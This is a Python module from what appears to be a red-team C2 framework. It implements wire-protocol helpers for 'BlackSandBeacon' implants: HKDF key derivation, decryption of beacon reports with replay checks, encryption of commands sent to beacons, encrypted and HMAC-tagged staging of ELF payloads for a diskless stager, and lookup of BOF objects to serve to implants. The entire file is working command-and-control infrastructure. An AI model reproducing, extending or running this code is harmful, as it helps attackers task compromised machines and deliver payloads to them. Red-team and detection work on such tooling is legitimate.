"""BlackSandBeacon wire-protocol compatibility helpers.

BlackSandBeacon beacons derive their working AES key from the raw C2 key
material with HKDF-SHA256 (salt ``blacksandbeacon-v2``, info ``enc`` /
``hmac``), so their traffic never uses the on-disk key directly. Every
beacon report also carries a replay-protection envelope: the plaintext is
``counter (8 bytes LE) || timestamp (8 bytes LE) || payload``.

The C2 speaks the legacy protocol (raw key, no envelope) for its own
beacons, so these helpers derive the matching BSB keys from the same
on-disk key file and decode the envelope. Result handling tries the
legacy format first and falls back to BSB, so both client families check
in against the same C2.

Contracts:
    - ``derive_bsb_keys``: HKDF-SHA256 key separation matching BSB's C code.
    - ``decrypt_bsb_report``: decode one BSB report (b64 IV + ciphertext).
    - ``encrypt_bsb_command``: legacy wire format under the BSB-derived key.
    - ``resolve_bof_object``: multi-directory BOF object lookup mirroring
      the upstream ``handle_bof`` in ``c2/server.py``.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import logging
import os
import time
from pathlib import Path

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.hkdf import HKDF

log = logging.getLogger("bsb_compat")

HKDF_SALT = b"blacksandbeacon-v2"
HKDF_INFO_ENC = b"enc"
HKDF_INFO_HMAC = b"hmac"
STAGE_HKDF_SALT = b"blacksandbeacon-stage-v2"
STAGE_HKDF_INFO_ENC = b"stage-enc"
STAGE_HKDF_INFO_HMAC = b"stage-hmac"
REPLAY_HEADER_BYTES = 16  # counter (8 LE) + timestamp (8 LE)
TIMESTAMP_FUTURE_SLACK_S = 60
DEFAULT_REPLAY_WINDOW_S = 300

BASE_DIR = Path(__file__).resolve().parent.parent
BSB_CHECKOUT_RELPATH = "external/.exploit/blacksandbeacon"
BOF_STAGING_RELPATHS: tuple[str, ...] = (
    "sessions/temp_uploads/bofs",
    "sessions/uploads",
)
BOF_CHECKOUT_RELPATHS: tuple[str, ...] = ("", "build/bof", "bof")
BOF_OBJECT_SUFFIXES: tuple[str, ...] = ("", ".x64.o", ".o")

_key_cache: dict[str, bytes] = {"source": b"", "enc": b"", "hmac": b""}
_stage_key_cache: dict[str, object] = {"token": "", "keys": (b"", b"")}


def derive_bsb_keys(master_key: bytes) -> tuple[bytes, bytes]:
    """Derive the BSB encryption and HMAC keys from the raw C2 key.

    Args:
        master_key: Raw 32-byte key material (the ``sessions/key.aes``
            contents beacons were configured with).

    Returns:
        ``(encryption_key, hmac_key)``, both 32 bytes. Derived values are
        cached and recomputed only when the source key rotates.

    Raises:
        ValueError: Key material is not exactly 32 bytes.
    """
    if not isinstance(master_key, (bytes, bytearray)) or len(master_key) != 32:
        raise ValueError("BSB master key must be 32 bytes")
    master_key = bytes(master_key)
    if _key_cache["source"] == master_key:
        return _key_cache["enc"], _key_cache["hmac"]
    enc = HKDF(
        algorithm=hashes.SHA256(),
        length=32,
        salt=HKDF_SALT,
        info=HKDF_INFO_ENC,
        backend=default_backend(),
    ).derive(master_key)
    mac = HKDF(
        algorithm=hashes.SHA256(),
        length=32,
        salt=HKDF_SALT,
        info=HKDF_INFO_HMAC,
        backend=default_backend(),
    ).derive(master_key)
    _key_cache.update(source=master_key, enc=enc, hmac=mac)
    log.debug("[bsb_compat] HKDF keys derived")
    return enc, mac


def decrypt_bsb_report(
    encrypted_data: bytes | str,
    master_key: bytes,
    replay_window_seconds: int = DEFAULT_REPLAY_WINDOW_S,
) -> tuple[dict, int, int]:
    """Decrypt and decode one BSB report.

    Args:
        encrypted_data: Base64 text (or bytes of it) as sent by the
            beacon: ``b64(IV || AES-256-CFB ciphertext)``.
        master_key: Raw 32-byte C2 key material.
        replay_window_seconds: Accepted past timestamp window.

    Returns:
        ``(payload_dict, counter, timestamp)`` on success.

    Raises:
        ValueError: Malformed base64, decryption failure, replay envelope
            out of bounds, or the payload is not valid JSON.
    """
    enc_key, _ = derive_bsb_keys(master_key)
    if isinstance(encrypted_data, str):
        encrypted_data = encrypted_data.encode("ascii", "ignore")
    raw = base64.b64decode(encrypted_data, validate=False)
    if len(raw) <= 16:
        raise ValueError("BSB payload shorter than IV + envelope")
    iv, ciphertext = raw[:16], raw[16:]
    decryptor = Cipher(algorithms.AES(enc_key), modes.CFB(iv), backend=default_backend()).decryptor()
    plaintext = decryptor.update(ciphertext) + decryptor.finalize()
    if len(plaintext) <= REPLAY_HEADER_BYTES:
        raise ValueError("BSB payload missing replay envelope")
    counter = int.from_bytes(plaintext[:8], "little")
    timestamp = int.from_bytes(plaintext[8:REPLAY_HEADER_BYTES], "little")
    now = int(time.time())
    if counter <= 0:
        raise ValueError(f"BSB counter invalid: {counter}")
    if timestamp > now + TIMESTAMP_FUTURE_SLACK_S:
        if timestamp > (now + TIMESTAMP_FUTURE_SLACK_S) * 64:
            raise ValueError(
                "BSB envelope decrypted to garbage — the beacon was built with a "
                "different key (key rotated); rebuild or re-register the beacon"
            )
        raise ValueError(f"BSB timestamp in future: {timestamp} > {now + TIMESTAMP_FUTURE_SLACK_S}")
    if timestamp < now - replay_window_seconds:
        raise ValueError(f"BSB timestamp too old: {timestamp} < {now - replay_window_seconds}")
    try:
        payload = json.loads(plaintext[REPLAY_HEADER_BYTES:])
    except (ValueError, UnicodeDecodeError) as exc:
        raise ValueError(f"BSB payload is not JSON: {exc}") from exc
    if not isinstance(payload, dict):
        raise ValueError("BSB payload is not a JSON object")
    return payload, counter, timestamp


def encrypt_bsb_command(data: bytes, master_key: bytes) -> str:
    """Encrypt one command for a BSB beacon in the legacy wire format.

    BSB beacons poll with ``GET /command/<id>`` and decrypt the response
    body as ``b64(IV || ciphertext)`` under their HKDF-derived encryption
    key, so the C2 must produce exactly that under the same key.

    Args:
        data: Command text (empty bytes allowed).
        master_key: Raw 32-byte C2 key material.

    Returns:
        Base64 string of ``IV || ciphertext`` ready as the response body.
    """
    enc_key, _ = derive_bsb_keys(master_key)
    if not data:
        data = b"\x00"
    iv_bytes = os.urandom(16)
    encryptor = Cipher(algorithms.AES(enc_key), modes.CFB(iv_bytes), backend=default_backend()).encryptor()
    ciphertext = encryptor.update(data) + encryptor.finalize()
    return base64.b64encode(iv_bytes + ciphertext).decode("utf-8")


def derive_bsb_stage_keys(token: str) -> tuple[bytes, bytes]:
    """Derive the staging encryption and HMAC keys from a staging token.

    Mirrors the diskless stager contract (``c2/stage_payload.py`` and
    ``c2/server.py``): HKDF-SHA256 over the UTF-8 token with salt
    ``blacksandbeacon-stage-v2`` and info ``stage-enc`` / ``stage-hmac``.

    Args:
        token: Staging token shared between the C2 and the stager.

    Returns:
        ``(encryption_key, hmac_key)``, both 32 bytes. Derived values are
        cached and recomputed only when the token rotates.

    Raises:
        ValueError: Token is empty.
    """
    clean = str(token or "").strip()
    if not clean:
        raise ValueError("BSB staging token must not be empty")
    cached_token = _stage_key_cache["token"]
    cached_keys = _stage_key_cache["keys"]
    if cached_token == clean and isinstance(cached_keys, tuple) and isinstance(cached_keys[0], bytes):
        enc, mac = cached_keys
        return enc, mac
    ikm = clean.encode("utf-8")
    enc = HKDF(
        algorithm=hashes.SHA256(),
        length=32,
        salt=STAGE_HKDF_SALT,
        info=STAGE_HKDF_INFO_ENC,
        backend=default_backend(),
    ).derive(ikm)
    mac = HKDF(
        algorithm=hashes.SHA256(),
        length=32,
        salt=STAGE_HKDF_SALT,
        info=STAGE_HKDF_INFO_HMAC,
        backend=default_backend(),
    ).derive(ikm)
    _stage_key_cache["token"] = clean
    _stage_key_cache["keys"] = (enc, mac)
    log.debug("[bsb_compat] stage HKDF keys derived")
    return enc, mac


def encrypt_bsb_stage_blob(data: bytes, token: str) -> str:
    """Encrypt one staging payload in the diskless-stager wire format.

    The stager decodes ``b64(IV || AES-256-CFB ciphertext || HMAC-SHA256
    tag)`` where the tag covers ``IV || ciphertext`` and both keys are
    HKDF-derived from the staging token, so the C2 must produce exactly
    that layout.

    Args:
        data: Payload bytes (ELF image or config JSON).
        token: Staging token shared with the beacon stager.

    Returns:
        Base64 string ready as the response body.
    """
    enc_key, mac_key = derive_bsb_stage_keys(token)
    iv_bytes = os.urandom(16)
    encryptor = Cipher(algorithms.AES(enc_key), modes.CFB(iv_bytes), backend=default_backend()).encryptor()
    ciphertext = encryptor.update(data) + encryptor.finalize()
    body = iv_bytes + ciphertext
    tag = hmac.new(mac_key, body, hashlib.sha256).digest()
    return base64.b64encode(body + tag).decode("utf-8")


def decrypt_bsb_stage_blob(encrypted_data: bytes | str, token: str) -> bytes:
    """Decode one staging payload exactly the way the upstream stager does.

    Args:
        encrypted_data: ``b64(IV || ciphertext || tag)`` as produced by
            :func:`encrypt_bsb_stage_blob`.
        token: Staging token shared with the C2.

    Returns:
        The plaintext payload bytes.

    Raises:
        ValueError: Malformed base64, bad tag, or decryption failure.
    """
    enc_key, mac_key = derive_bsb_stage_keys(token)
    if isinstance(encrypted_data, str):
        encrypted_data = encrypted_data.encode("ascii", "ignore")
    raw = base64.b64decode(encrypted_data, validate=False)
    if len(raw) < 16 + 32:
        raise ValueError("BSB stage payload too short")
    tag, body = raw[-32:], raw[:-32]
    expected = hmac.new(mac_key, body, hashlib.sha256).digest()
    if not hmac.compare_digest(tag, expected):
        raise ValueError("BSB stage tag mismatch (bad token or tampered payload)")
    iv, ciphertext = body[:16], body[16:]
    decryptor = Cipher(algorithms.AES(enc_key), modes.CFB(iv), backend=default_backend()).decryptor()
    return decryptor.update(ciphertext) + decryptor.finalize()


def _bof_search_dirs(repo_root: Path) -> list[Path]:
    """Return the BOF lookup directories in the upstream server's order.

    Args:
        repo_root: LazyOwn repository root.

    Returns:
        Existing directories: the C2 staging dirs first, then the
        blacksandbeacon checkout build locations (checkout root,
        ``build/bof``, ``bof``).
    """
    dirs: list[Path] = [repo_root / relpath for relpath in BOF_STAGING_RELPATHS]
    checkout = repo_root / BSB_CHECKOUT_RELPATH
    dirs.extend(checkout / relpath for relpath in BOF_CHECKOUT_RELPATHS)
    unique: list[Path] = []
    for path in dirs:
        resolved = path.resolve()
        if resolved.is_dir() and resolved not in unique:
            unique.append(resolved)
    return unique


def _safe_bof_candidate(base: Path, relative: str) -> Path | None:
    """Join one lookup candidate, rejecting traversal outside ``base``.

    Args:
        base: Directory the candidate is relative to.
        relative: Candidate filename or repository-relative path.

    Returns:
        The confined candidate path, or None when it escapes ``base``.
    """
    clean = str(relative or "").strip()
    if not clean or clean.startswith(("/", "\\")) or "\\" in clean:
        return None
    parts = Path(clean).parts
    if ".." in parts:
        return None
    candidate = (base / clean).resolve()
    try:
        if candidate.parent != base and os.path.commonpath([str(base), str(candidate)]) != str(base):
            return None
    except ValueError:
        return None
    return candidate


def resolve_bof_object(
    name: str,
    relative_artifact: str = "",
    repo_root: str | Path | None = None,
) -> str | None:
    """Resolve one compiled BOF object the way the upstream BSB server does.

    Mirrors ``handle_bof`` in the upstream ``c2/server.py``: a
    basename-safe lookup across the BOF serving directories and the
    common build locations of the blacksandbeacon checkout, so the C2
    route and the operator staging share one resolution contract and a
    BOF compiled in the client tree is servable without a manual copy.

    Args:
        name: BOF name (``whoami``) or object filename (``whoami.x64.o``).
        relative_artifact: Optional ``client_artifact`` declared in the
            BOF YAML (``build/bof/whoami.x64.o``), tried relative to the
            checkout root.
        repo_root: Override for tests; defaults to the repo root.

    Returns:
        Path to the first existing object file, or None when unresolved.
    """
    root = Path(repo_root) if repo_root is not None else BASE_DIR
    safe = os.path.basename(str(name or "").strip())
    if not safe or safe in (".", ".."):
        return None
    bases = _bof_search_dirs(root)
    checkout = (root / BSB_CHECKOUT_RELPATH).resolve()
    artifact = str(relative_artifact or "").strip()
    for base in bases:
        names = [safe] if safe.endswith(".o") else [f"{safe}{suffix}" for suffix in BOF_OBJECT_SUFFIXES]
        for candidate_name in names:
            candidate = _safe_bof_candidate(base, candidate_name)
            if candidate is not None and candidate.is_file():
                return str(candidate)
        if artifact and base == checkout:
            candidate = _safe_bof_candidate(base, artifact)
            if candidate is not None and candidate.is_file():
                return str(candidate)
    return None


__all__ = [
    "derive_bsb_keys",
    "decrypt_bsb_report",
    "encrypt_bsb_command",
    "derive_bsb_stage_keys",
    "encrypt_bsb_stage_blob",
    "decrypt_bsb_stage_blob",
    "resolve_bof_object",
    "HKDF_SALT",
    "STAGE_HKDF_SALT",
    "REPLAY_HEADER_BYTES",
]
